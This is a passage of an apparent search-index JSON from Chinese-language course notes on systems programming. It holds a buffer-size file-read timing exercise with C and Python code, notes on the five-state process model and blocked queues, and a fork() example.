Prac","text":""},{"location":"cs/c/4.3/#workshop","title":"Workshop","text":"<p>\u5728\u8fd9\u4e2a\u7814\u8ba8\u4f1a\u4e2d\uff0c\u4f60\u5c06\u5b66\u4e60\u5982\u4f55\u6d4b\u91cf\u8bfb\u53d6\u6587\u4ef6\u6240\u9700\u7684\u65f6\u95f4\uff0c\u5305\u62ec\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u95f4\u548c\u4e0d\u540c\u5927\u5c0f\u8f93\u5165\u7f13\u51b2\u533a\u7684\u8bfb\u5199\u65f6\u95f4\u3002\u9996\u5148\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u5f88\u5927\u7684\u6587\u4ef6\u4ee5\u4fbf\u8fdb\u884c\u6d4b\u8bd5\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u5927\u7ea61GB\u7684\u6587\u4ef6\uff1a</p> <pre><code>for i in {1..1000} ; do cat /bin/bash &gt;&gt; /tmp/huge ; done\n</code></pre> <p>\u4f60\u7684\u7a0b\u5e8f\u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff1a</p> <ul> <li>\u6587\u4ef6\u8def\u5f84\uff08\u4f8b\u5982 /tmp/huge\uff09</li> </ul> <ul> <li>\u8f93\u5165\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff08\u4f8b\u5982 1000 \u5b57\u8282\uff09</li> </ul> <pre><code>./readtest /tmp/huge 1000\n</code></pre>"},{"location":"cs/c/4.3/#time-measurement","title":"Time measurement","text":"<ul> <li>\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u95f4</li> </ul> <ul> <li>\u8bfb\u53d6\u6587\u4ef6\u7684\u65f6\u95f4\uff08\u6309\u4e0d\u540c\u7684\u7f13\u51b2\u533a\u5927\u5c0f\uff09</li> </ul>"},{"location":"cs/c/4.3/#sample-solution","title":"Sample solution","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/time.h&gt;\n\nvoid measure_time(const char* filename, size_t buffer_size) {\n    int fd = open(filename, O_RDONLY);\n    if (fd &lt; 0) {\n        perror(\"open\");\n        exit(EXIT_FAILURE);\n    }\n\n    char *buffer = malloc(buffer_size);\n    if (buffer == NULL) {\n        perror(\"malloc\");\n        exit(EXIT_FAILURE);\n    }\n\n    ssize_t bytes_read;\n    struct timeval start, end;\n\n    // Start time measurement\n    gettimeofday(&amp;start, NULL);\n\n    while ((bytes_read = read(fd, buffer, buffer_size)) &gt; 0) {\n        // Do nothing with the data, just measure read time\n    }\n\n    // End time measurement\n    gettimeofday(&amp;end, NULL);\n\n    close(fd);\n    free(buffer);\n\n    if (bytes_read &lt; 0) {\n        perror(\"read\");\n        exit(EXIT_FAILURE);\n    }\n\n    long seconds = end.tv_sec - start.tv_sec;\n    long microseconds = end.tv_usec - start.tv_usec;\n    double elapsed = seconds + microseconds*1e-6;\n\n    printf(\"Time taken: %.6f seconds\\n\", elapsed);\n}\n\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        fprintf(stderr, \"Usage: %s &lt;filename&gt; &lt;buffer_size&gt;\\n\", argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    const char *filename = argv[1];\n    size_t buffer_size = atoi(argv[2]);\n\n    measure_time(filename, buffer_size);\n\n    return 0;\n}\n</code></pre> <p>\u5b9e\u73b0\u7684\u6838\u5fc3\u5c31\u662f\u7528 gettimeofday \u51fd\u6570\u8ba1\u7b97\u5f53\u5929\u65f6\u95f4\u70b9\uff0c\u76f8\u5173\u4f7f\u7528\u7ec6\u8282\u67e5\u770b section 2.4, \u6700\u540e\u6559\u6388\u7528 google js \u7684\u4e00\u4e2a\u5de5\u5177\u7ed3\u5408 bash \u6587\u4ef6\u751f\u6210\u4e86\u4e00\u4e2a\u6570\u636e\u53ef\u89c6\u5316\u56fe\u8868\uff0c\u6beb\u79d2 vs buffersize, \u4e5f\u53ef\u4ee5\u7528 Excel \u6216\u8005 python matplotlib \u505a</p> <p><code>open plot.html</code> \u4f1a\u76f4\u63a5\u5728\u9ed8\u8ba4\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u6587\u4ef6</p> <pre><code>import matplotlib.pyplot as plt\n\nsizes = []\ntimes = []\n\nwith open('results.txt', 'r') as file:\n    for line in file:\n        size, time = line.split()\n        sizes.append(int(size))\n        times.append(float(time))\n\nplt.plot(sizes, times, 'o-')\nplt.xlabel('Buffer Size (bytes)')\nplt.ylabel('Time Taken (seconds)')\nplt.title('Time Taken vs Buffer Size')\nplt.show()\n</code></pre> <p>\u8fd9\u79cd\u7a0b\u5e8f\u5728\u65e5\u540e\u80fd\u591f\u7528\u4e8e\u5206\u6790\u7a0b\u5e8f\u7684\u5185\u5b58\u5360\u7528\u7684\u5de5\u5177\u7684\u8bbe\u8ba1\u601d\u8def</p>"},{"location":"cs/c/4.3/#lab","title":"Lab","text":"<p>\u6ca1\u65f6\u95f4\uff0c\u540e\u7eed\u8865\u4e0a\uff0c\u5148\u770b sample \u9898\u76ee</p>"},{"location":"cs/c/5.1/","title":"5.1 Processes","text":""},{"location":"cs/c/5.1/#mon-lecture","title":"Mon Lecture","text":"<p>\u8fdb\u5ea6\u76ee\u524d\u521a\u521a\u5230 Lecture 8 \u6bd4\u8f83\u8d76\uff0cmidterm \u751a\u81f3\u6db5\u76d6 Lecture 9</p> <p>\u53d8\u91cf\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u5185\u5b58\u4f4d\u7f6e\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5bf9\u5176\u4f4d\u7f6e\u8fdb\u884c\u8bb0\u5fc6</p> <p>\u4e0a\u4e0b\u6587\u5207\u6362\uff08Context Switch\uff09\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u591a\u4efb\u52a1\u73af\u5883\u4e2d\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u5173\u952e\u64cd\u4f5c\u3002\u5b83\u6307\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u4e4b\u95f4\u5207\u6362\u65f6\u6240\u9700\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u72b6\u6001\u548c\u52a0\u8f7d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u72b6\u6001\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u662f\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u5e76\u53d1\u7684\u57fa\u7840\u3002</p>"},{"location":"cs/c/5.1/#states","title":"States","text":"<p>\u8ba1\u7b97\u673a\u53ef\u80fd\u6709\u4e94\u516d\u767e\u4e2a\u8fdb\u7a0b\uff0c\u5c06\u8fd9\u4e9b\u8fdb\u7a0b\u653e\u8fdb arrary \u7ed3\u6784\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\uff0clink list \u4e0a\u4e0b\u8fde\u63a5\uff0c\u67e5\u770b\u542f\u52a8\u505c\u6b62\uff0c</p> <p>two possible process states that a process may be in at any one time: Running and Ready.</p> <p>\u5206\u9875\u673a\u5236\uff1a</p> <ul> <li>\u5206\u9875\uff08Paging\uff09 \u662f\u4e00\u79cd\u5185\u5b58\u7ba1\u7406\u65b9\u6848\uff0c\u5c06\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5212\u5206\u4e3a\u9875\u9762\uff0c\u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u4e3a\u76f8\u540c\u5927\u5c0f\u7684\u9875\u6846\u3002</li> </ul> <ul> <li>\u5f53\u8fdb\u7a0b\u9700\u8981\u8bbf\u95ee\u5185\u5b58\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u9875\u8868\uff0c\u9875\u8868\u8bb0\u5f55\u4e86\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u6846\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\u3002</li> </ul>"},{"location":"cs/c/5.1/#transition","title":"Transition","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u5177\u6709\u8c03\u5ea6\u5458\u7684\u89d2\u8272 - \u6839\u636e\u67d0\u4e9b\u5b9a\u4e49\u7684\u7b56\u7565\u4e3a\u5904\u7406\u5668\u5206\u6d3e\u5de5\u4f5c \u89e3\u51b3\u516c\u5e73\u6027\u3001\u4f18\u5148\u7ea7\u3001\u660e\u663e\u7684\u201c\u4e92\u52a8\u6027\u201d\u7b49\u95ee\u9898\u3002</p> <p></p> <p>fork parent child</p>"},{"location":"cs/c/5.1/#termination","title":"Termination","text":"<p><code>ulimate -a</code> \u80fd\u591f\u8bbe\u7f6e\u7a0b\u5e8f\u8fd0\u884c\u65f6\u95f4\u548c\u5360\u7528\u5185\u5b58\u7b49\u53c2\u6570</p> <p>\u65f6\u949f\u662f\u5426\u6b63\u5728\u8fd0\u884c\uff0c\u4f1a\u5bf9\u68c0\u67e5</p> <p>\u907f\u514d\u8fdb\u7a0b\u95f2\u7f6e\uff0c\u5728\u8fd0\u884c\u522b\u7684\u8fdb\u7a0b\u7684 IO \u963b\u585e\u7684\u65f6\u5019\u6267\u884c\u7684\u522b\u7684\u4e1c\u897f blocking </p> <p></p> <p>dispatch \u662f\u6d3e\u9063\u7684\u610f\u601d admit \u8ba4\u9886</p> <p>The 5-State Model of Process Execution \u662f\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u8fdb\u7a0b\u72b6\u6001\u8f6c\u6362\u7684\u7ecf\u5178\u6a21\u578b\u3002\u5b83\u5b9a\u4e49\u4e86\u8fdb\u7a0b\u5728\u6267\u884c\u671f\u95f4\u53ef\u80fd\u5904\u4e8e\u7684\u4e94\u79cd\u72b6\u6001\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u8f6c\u6362\u5173\u7cfb\u3002\u4ee5\u4e0b\u662f\u8fd9\u4e94\u4e2a\u72b6\u6001\u53ca\u5176\u89e3\u91ca\uff1a</p>"},{"location":"cs/c/5.1/#1-new","title":"1. New\uff08\u65b0\u5efa\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a<ul> <li>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521a\u88ab\u521b\u5efa\u65f6\uff0c\u5b83\u5904\u4e8e New \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u4e86\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u5e76\u4e3a\u8fdb\u7a0b\u5efa\u7acb\u4e86\u76f8\u5173\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u8fdb\u7a0b\u8fd8\u6ca1\u6709\u51c6\u5907\u597d\u8fd0\u884c\u3002</li> </ul> </li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a<ul> <li>\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5b8c\u6210\u5bf9\u65b0\u8fdb\u7a0b\u7684\u521d\u59cb\u5316\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165 Ready \u72b6\u6001\uff0c\u51c6\u5907\u88ab\u8c03\u5ea6\u5668\u8c03\u5ea6\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#2-ready","title":"2. Ready\uff08\u5c31\u7eea\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a<ul> <li>\u5904\u4e8e Ready \u72b6\u6001\u7684\u8fdb\u7a0b\u5df2\u7ecf\u5206\u914d\u4e86\u6240\u9700\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u51c6\u5907\u597d\u8fd0\u884c\u3002\u5b83\u6b63\u5728\u7b49\u5f85 CPU \u8d44\u6e90\u3002</li> </ul> </li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a<ul> <li>\u5f53\u8c03\u5ea6\u5668\u51b3\u5b9a\u5c06 CPU \u5206\u914d\u7ed9\u8be5\u8fdb\u7a0b\u65f6\uff0c\u5b83\u4f1a\u4ece Ready \u72b6\u6001\u8f6c\u79fb\u5230 Running \u72b6\u6001\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#3-running","title":"3. Running\uff08\u8fd0\u884c\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a<ul> <li>\u8fdb\u7a0b\u88ab\u5206\u914d\u5230 CPU \u5e76\u6b63\u5728\u6267\u884c\u65f6\uff0c\u5904\u4e8e Running \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u8fdb\u7a0b\u5b9e\u9645\u5360\u7528 CPU \u5e76\u6267\u884c\u6307\u4ee4\u3002</li> </ul> </li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a<ul> <li>\u8fdb\u7a0b\u53ef\u80fd\u4ece Running \u72b6\u6001\u8f6c\u79fb\u5230\u4ee5\u4e0b\u51e0\u79cd\u72b6\u6001\uff1a<ul> <li>Blocked\uff1a\u5982\u679c\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u79cd\u8d44\u6e90\uff08\u5982 I/O \u64cd\u4f5c\uff09\uff0c\u5b83\u4f1a\u8fdb\u5165 Blocked \u72b6\u6001\u3002</li> <li>Ready\uff1a\u5982\u679c\u8fdb\u7a0b\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u4f46\u8fd8\u6ca1\u6709\u5b8c\u6210\uff0c\u5b83\u4f1a\u56de\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Terminated\uff1a\u5982\u679c\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u5f3a\u5236\u7ec8\u6b62\uff0c\u5b83\u4f1a\u8fdb\u5165 Terminated \u72b6\u6001\u3002</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#4-blocked","title":"4. Blocked\uff08\u963b\u585e\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a<ul> <li>\u5f53\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u83b7\u53d6\u8d44\u6e90\u7b49\uff09\u65f6\uff0c\u5b83\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u5728\u8fd9\u4e2a\u72b6\u6001\u4e0b\uff0c\u8fdb\u7a0b\u4e0d\u80fd\u8fd0\u884c\uff0c\u751a\u81f3\u4e0d\u80fd\u88ab\u8c03\u5ea6\uff0c\u76f4\u5230\u4e8b\u4ef6\u53d1\u751f\u3002</li> </ul> </li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a<ul> <li>\u4e00\u65e6\u7b49\u5f85\u7684\u4e8b\u4ef6\u53d1\u751f\uff0c\u8fdb\u7a0b\u4f1a\u4ece Blocked \u72b6\u6001\u8f6c\u79fb\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85 CPU \u5206\u914d\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#5-terminated","title":"5. Terminated\uff08\u7ec8\u6b62\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a<ul> <li>\u5f53\u8fdb\u7a0b\u5b8c\u6210\u6267\u884c\u6216\u88ab\u64cd\u4f5c\u7cfb\u7edf\u7ec8\u6b62\u65f6\uff0c\u5b83\u8fdb\u5165 Terminated \u72b6\u6001\u3002\u6b64\u65f6\u8fdb\u7a0b\u7684\u6267\u884c\u7ed3\u675f\uff0c\u6240\u6709\u7684\u8d44\u6e90\u90fd\u5c06\u88ab\u91ca\u653e\u3002</li> </ul> </li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a<ul> <li>\u5728\u8fdb\u7a0b\u7ec8\u6b62\u4e4b\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u6e05\u7406\u8fdb\u7a0b\u6240\u4f7f\u7528\u7684\u8d44\u6e90\uff0c\u5305\u62ec\u5185\u5b58\u3001\u6587\u4ef6\u63cf\u8ff0\u7b26\u7b49\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#_1","title":"\u72b6\u6001\u8f6c\u6362\u56fe","text":"<p>\u4ee5\u4e0b\u662f\u8fdb\u7a0b\u5728\u4e0d\u540c\u72b6\u6001\u4e4b\u95f4\u8f6c\u6362\u7684\u4e3b\u8981\u65b9\u5f0f\uff1a</p> <ul> <li>New \u2192 Ready\uff1a\u8fdb\u7a0b\u521d\u59cb\u5316\u5b8c\u6210\uff0c\u51c6\u5907\u6267\u884c\u3002</li> <li>Ready \u2192 Running\uff1a\u8c03\u5ea6\u5668\u9009\u62e9\u8fdb\u7a0b\u5e76\u5206\u914d CPU\u3002</li> <li>Running \u2192 Blocked\uff1a\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\uff09\u3002</li> <li>Blocked \u2192 Ready\uff1a\u4e8b\u4ef6\u53d1\u751f\uff08\u5982 I/O \u5b8c\u6210\uff09\uff0c\u8fdb\u7a0b\u51c6\u5907\u518d\u6b21\u6267\u884c\u3002</li> <li>Running \u2192 Ready\uff1a\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u8fdb\u7a0b\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Running \u2192 Terminated\uff1a\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u7ec8\u6b62\u3002</li> </ul> <p>The 5-State Model \u63cf\u8ff0\u4e86\u8fdb\u7a0b\u4ece\u521b\u5efa\u5230\u7ec8\u6b62\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u53ef\u80fd\u7ecf\u5386\u7684\u4e94\u79cd\u72b6\u6001\u3002\u8fd9\u4e94\u79cd\u72b6\u6001\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u80fd\u591f\u6709\u6548\u5730\u8c03\u5ea6\u548c\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u786e\u4fdd\u8d44\u6e90\u7684\u5408\u7406\u5229\u7528\u548c\u8fdb\u7a0b\u7684\u5e76\u53d1\u6267\u884c\u3002</p>"},{"location":"cs/c/5.2/","title":"5.2 Multiple Blocked States","text":""},{"location":"cs/c/5.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u591a\u963b\u585e\u961f\u5217\u6a21\u578b\uff0c\u907f\u514d\u4e00\u4e2a\u4efb\u52a1\u5728 CPU \u6216 I/O \u7b49\u963b\u585e\u540e\u62d6\u6162\u8fdb\u5ea6</p> <p>\u8be5\u56fe\u5c55\u793a\u4e86\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684 Multiple Blocked Queues\uff08\u591a\u963b\u585e\u961f\u5217\uff09 \u6a21\u578b\u3002\u5728\u8fd9\u4e2a\u6a21\u578b\u4e2d\uff0c\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u4e8b\u4ef6\u800c\u8fdb\u5165\u963b\u585e\u72b6\u6001\uff0c\u5e76\u4e14\u6bcf\u4e2a\u963b\u585e\u72b6\u6001\u5bf9\u5e94\u4e00\u4e2a\u4e8b\u4ef6\u961f\u5217\u3002\u8fd9\u6709\u52a9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u66f4\u9ad8\u6548\u5730\u7ba1\u7406\u8fdb\u7a0b\u7684\u8c03\u5ea6\u3002</p>"},{"location":"cs/c/5.2/#_1","title":"\u56fe\u4e2d\u5173\u952e\u90e8\u5206\u7684\u89e3\u91ca\uff1a","text":"<ol> <li> <p>Ready Queue\uff08\u5c31\u7eea\u961f\u5217\uff09\uff1a</p> <ul> <li>\u6240\u6709\u51c6\u5907\u597d\u6267\u884c\u7684\u8fdb\u7a0b\u90fd\u88ab\u653e\u5728 Ready Queue \u4e2d\uff0c\u7b49\u5f85\u8c03\u5ea6\u5668\u5206\u914d CPU\u3002\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u8fdb\u7a0b\u4ece Ready Queue \u4e2d\u8c03\u5ea6\uff08Dispatch\uff09\u5e76\u5f00\u59cb\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002</li> </ul> </li> <li> <p>Processor\uff08\u5904\u7406\u5668\uff09\uff1a</p> <ul> <li>\u5904\u7406\u5668\u6267\u884c\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u8c03\u5ea6\u7684\u8fdb\u7a0b\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528 CPU \u8fdb\u884c\u8ba1\u7b97\u548c\u6267\u884c\u6307\u4ee4\u3002</li> </ul> </li> <li> <p>Timeout\uff08\u8d85\u65f6\uff09\uff1a</p> <ul> <li>\u5982\u679c\u5206\u914d\u7ed9\u8fdb\u7a0b\u7684\u65f6\u95f4\u7247\uff08CPU \u65f6\u95f4\uff09\u7528\u5b8c\u4e86\uff0c\u8fdb\u7a0b\u5c06\u8fd4\u56de Ready Queue\uff0c\u7b49\u5f85\u4e0b\u4e00\u4e2a\u8c03\u5ea6\u5468\u671f\u3002</li> </ul> </li> <li> <p>Event n Wait\uff08\u7b49\u5f85\u4e8b\u4ef6 n\uff09\uff1a</p> <ul> <li>\u5982\u679c\u8fd0\u884c\u4e2d\u7684\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u4e2a\u5916\u90e8\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u5b83\u5c06\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u79fb\u9664\uff0c\u5e76\u8fdb\u5165\u76f8\u5e94\u7684 Event Queue\uff08\u4e8b\u4ef6\u961f\u5217\uff09\u4e2d\uff0c\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u8fd9\u4e2a\u6a21\u578b\u4f7f\u7528\u591a\u4e2a\u963b\u585e\u961f\u5217\uff0c\u4ee3\u8868\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u7684\u4e8b\u4ef6\uff08\u5982\u591a\u4e2a I/O \u64cd\u4f5c\uff09\u8fdb\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\u3002</li> </ul> </li> <li> <p>Event n Queue\uff08\u4e8b\u4ef6 n \u963b\u585e\u961f\u5217\uff09\uff1a</p> <ul> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u9700\u8981\u7b49\u5f85\u7684\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u4fe1\u53f7\u7b49\uff09\uff0c\u90fd\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u961f\u5217\u3002\u88ab\u963b\u585e\u7684\u8fdb\u7a0b\u8fdb\u5165\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\uff0c\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\u3002</li> </ul> </li> <li> <p>Event n Occurs\uff08\u4e8b\u4ef6 n \u53d1\u751f\uff09\uff1a</p> <ul> <li>\u5f53\u67d0\u4e2a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u4f8b\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88ab\u79fb\u51fa\u5e76\u653e\u56de Ready Queue\uff0c\u51c6\u5907\u518d\u6b21\u88ab\u8c03\u5ea6\u6267\u884c\u3002</li> </ul> </li> <li> <p>Release\uff08\u91ca\u653e\uff09\uff1a</p> <ul> <li>\u5f53\u8fdb\u7a0b\u5b8c\u6210\u6240\u6709\u4efb\u52a1\u65f6\uff0c\u5b83\u4f1a\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u91ca\u653e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8be5\u8fdb\u7a0b\u7684\u6267\u884c\u3002</li> </ul> </li> </ol> <p>Multiple Blocked Queues \u6a21\u578b\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u6839\u636e\u4e0d\u540c\u4e8b\u4ef6\u5c06\u8fdb\u7a0b\u653e\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\uff0c\u7b49\u5f85\u76f8\u5e94\u4e8b\u4ef6\u7684\u5b8c\u6210\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u5e76\u63d0\u9ad8\u7cfb\u7edf\u7684\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002</p> <p>\u963b\u585e\u8fdb\u7a0b\u542f\u7528\u865a\u62df\u5185\u5b58\u8c03\u7528\u5b58\u5165 disk \u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63d0\u4f9b\u66f4\u591a\u5185\u5b58\u652f\u6301\u5176\u4ed6\u4efb\u52a1\uff0c\u5f53\u6ca1\u6709\u5176\u4ed6\u4efb\u52a1\u7684\u65f6\u5019\u4ece\u4e2d\u53d6\u51fa\u518d\u7ee7\u7eed\u6267\u884c\uff0c\u53d6\u51fa\u4e4b\u524d\u79f0\u4e4b\u4e3a Suspend \u72b6\u6001</p> <p>\u7cfb\u7edf\u8c03\u7528 fork system call:</p> <p>\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u5b8c\u5168 copy \u5386\u53f2\u4e2d\u53eb\u514b\u9686\u8fc7\u7a0b fork </p>"},{"location":"cs/c/5.2/#creating-a-new-process-using-fork","title":"Creating a new process using fork()","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;unistd.h&gt;\n\nvoid function(void)\n{\n    int  pid;                 // some systems define a pid_t\n\n    switch (pid = fork()) {\n    case -1 :\n        printf(\"fork() failed\\n\");     // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                   // new child process\n        printf(\"c:  value of pid=%i\\n\", pid);\n        printf(\"c:  child's pid=%i\\n\", getpid());\n        printf(\"c:  child's parent pid=%i\\n\", getppid());\n        break;\n\n    default:                  // original parent process\n        sleep(1);\n        printf(\"p:  value of pid=%i\\n\", pid);\n        printf(\"p:  parent's pid=%i\\n\", getpid());\n        printf(\"p:  parent's parent pid=%i\\n\", getppid());\n        break;\n    }\n    fflush(stdout);\n}\n</code></pre> <p>fork() \u662f UNIX \u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u3002\u5b83\u4f1a\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u7236\u8fdb\u7a0b\u201d\uff09\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\u7684\u65b0\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u5b50\u8fdb\u7a0b\u201d\uff09\u3002\u65b0\u8fdb\u7a0b\u7684\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u4e0e\u7236\u8fdb\u7a0b\u4e00\u81f4\uff0c\u4f46\u5b83\u4eec\u662f\u72ec\u7acb\u8fd0\u884c\u7684\u3002</p> <p>fork() \u8c03\u7528\u7684\u8fd4\u56de\u503c\uff1a</p> <ul> <li>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID (PID)\u3002</li> <li>\u5728\u5b50\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de 0\u3002</li> <li>\u5982\u679c fork() \u8c03\u7528\u5931\u8d25\uff0c\u5219\u8fd4\u56de -1\u3002</li> </ul> <p>\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u90fd\u4f1a\u6709\u4e00\u4e2a\u72ec\u7acb\u7684 pid\u3002</p> <p>fork() \u8c03\u7528\u4f1a\u5c1d\u8bd5\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u3002\u5982\u679c fork() \u5931\u8d25\uff08\u8fd4\u56de -1\uff09\uff0c\u7a0b\u5e8f\u4f1a\u6253\u5370 \u201cfork() failed\u201d \u5e76\u7ec8\u6b62\u3002</p> <p>\u5982\u679c fork() \u5728\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de 0\uff0c\u8fdb\u5165 case 0\u3002\u8fd9\u4e2a\u5757\u6253\u5370\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\uff0c\u5305\u62ec pid\u3001getpid() \u548c getppid()\uff0c\u5206\u522b\u662f\u5b50\u8fdb\u7a0b\u81ea\u5df1\u7684\u8fdb\u7a0b ID 